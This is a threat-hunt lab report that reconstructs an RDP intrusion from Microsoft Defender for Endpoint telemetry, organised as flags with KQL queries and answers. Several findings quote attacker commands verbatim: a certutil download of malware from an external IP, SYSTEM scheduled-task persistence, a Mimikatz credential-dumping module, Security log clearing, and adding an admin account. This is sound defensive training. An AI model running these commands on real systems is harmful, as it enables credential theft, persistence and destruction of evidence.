Threat Hunt Report

Incident Type: Multi-Stage Intrusion (Initial Access → C2 → Exfiltration)
Platform: Microsoft Defender for Endpoint (MDE)
Device: azuki-*
Analyst: Josh
Date: (Lab Exercise)

Executive Summary

This threat hunt identified a full attack lifecycle conducted by a remote threat actor using stolen credentials and built-in Windows tools (LOLBins). The attacker achieved initial access via RDP, performed network discovery, established defense evasion through Windows Defender exclusions, deployed persistence mechanisms, executed credential theft, staged and exfiltrated data via a legitimate cloud service, and attempted anti-forensic log tampering.

The investigation leveraged multiple MDE telemetry tables including DeviceLogonEvents, DeviceProcessEvents, DeviceRegistryEvents, DeviceFileEvents, and DeviceNetworkEvents to reconstruct attacker activity.

Attack Timeline Overview
MITRE Tactic	Flag	Description
Initial Access	1–2	RDP login using compromised user
Discovery	3	Network reconnaissance via ARP
Defense Evasion	4–7	Hidden staging, Defender exclusions, LOLBins
Persistence	8–9, 17	Scheduled task + admin account
Command & Control	10–11	HTTPS C2 communication
Credential Access	12–13	LSASS credential dumping
Collection	14	Data archive creation
Exfiltration	15	Data sent via Discord
Anti-Forensics	16	Security log deletion
Execution	18	Malicious PowerShell script
Detailed Findings
🚩 Flag 1 — Initial Access: Remote Access Source

MITRE: Initial Access (T1078 / T1021)

Objective: Identify how the attacker gained access.

Telemetry Used: DeviceLogonEvents

KQL:

DeviceLogonEvents
| where LogonType == "RemoteInteractive"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemoteIPType, LogonType
| sort by Timestamp asc


Finding:
✔ Successful RDP logon from external IP address

Answer:
88.97.178.12

Analyst Insight:
Successful RemoteInteractive logons with external IPs are a common indicator of compromised credentials or exposed RDP services.

🚩 Flag 2 — Initial Access: Compromised User Account

MITRE: Credential Access / Initial Access

Finding:
Adding AccountName to the previous query revealed the compromised account.

Answer:
kenji.sato

🚩 Flag 3 — Discovery: Network Reconnaissance

MITRE: Discovery (T1016)

Telemetry Used: DeviceProcessEvents

Finding:
The attacker executed a command to enumerate network neighbors.

Answer:
arp.exe -a

Why This Matters:
arp -a reveals IP and MAC addresses of nearby systems, enabling lateral movement planning.

🚩 Flag 4 — Defense Evasion: Malware Staging Directory

MITRE: Defense Evasion (T1070 / T1564)

Telemetry Used: DeviceProcessEvents

Finding:
A hidden directory was deliberately created and reused.

Answer:
C:\ProgramData\WindowsCache

Key Command Observed:

attrib.exe +h +s C:\ProgramData\WindowsCache


Analyst Insight:
This directory served as the primary staging directory—a hidden workspace for malware and stolen data.

🚩 Flag 5 — Defense Evasion: File Extension Exclusions

MITRE: Defense Evasion (T1562.001)

Telemetry Used: DeviceRegistryEvents

Registry Path:

HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions


Finding:
Defender exclusions added for malicious file types.

Answer:
3 ( .ps1, .exe, .bat )

🚩 Flag 6 — Defense Evasion: Folder Exclusion

MITRE: Defense Evasion

Registry Path:

HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths


Answer:
C:\Users\KENJI~1.SAT\AppData\Local\Temp

Impact:
This Temp directory became a safe execution zone for malware.

🚩 Flag 7 — Defense Evasion: Download Utility Abuse

MITRE: Defense Evasion / Command Execution

Answer:
certutil.exe

Observed Command:

certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe


Insight:
This is a classic LOLBin technique to download malware while blending into normal system activity.

🚩 Flag 8 — Persistence: Scheduled Task Name

MITRE: Persistence (T1053.005)

Answer:
Windows Update Check

Command Observed:

schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc onlogon /ru SYSTEM /f

🚩 Flag 9 — Persistence: Scheduled Task Target

Answer:
C:\ProgramData\WindowsCache\svchost.exe

🚩 Flag 10 — Command & Control: C2 Server Address

MITRE: C2 (T1071)

Answer:
78.141.196.6

Telemetry Used: DeviceNetworkEvents

🚩 Flag 11 — Command & Control: C2 Port

Answer:
443

Insight:
HTTPS traffic allows C2 communication to blend into normal web traffic.

🚩 Flag 12 — Credential Access: Credential Theft Tool

MITRE: Credential Access (T1003)

Answer:
mm.exe

Insight:
Short, meaningless filenames commonly indicate renamed Mimikatz binaries.

🚩 Flag 13 — Credential Access: Memory Extraction Module

Answer:
sekurlsa::logonpasswords

Explanation:
This module extracts cleartext passwords, NTLM hashes, and Kerberos tickets from LSASS memory.

🚩 Flag 14 — Collection: Data Staging Archive

MITRE: Collection (T1560)

Answer:
export-data.zip

🚩 Flag 15 — Exfiltration: Exfiltration Channel

MITRE: Exfiltration (T1041)

Answer:
Discord

Insight:
Legitimate cloud services are frequently abused for stealthy data exfiltration.

🚩 Flag 16 — Anti-Forensics: Log Tampering

MITRE: Defense Evasion (T1070.001)

Answer:
Security

Observed Command:

wevtutil.exe cl Security


Impact:
Clearing the Security log removes critical forensic evidence.

🚩 Flag 17 — Impact: Persistence Account

MITRE: Persistence (T1136)

Answer:
support

Command Observed:

net.exe localgroup Administrators support /add

🚩 Flag 18 — Execution: Malicious Script

MITRE: Execution (T1059.001)

Answer:
wupdate.ps1

Observed Command:

powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File wupdate.ps1

Final Assessment

This intrusion demonstrates a textbook end-to-end attack chain, including:

Credential-based RDP compromise

Living-off-the-land execution

Defense evasion via Defender exclusions

SYSTEM-level persistence

Credential dumping from LSASS

Cloud-based data exfiltration

Anti-forensic log deletion
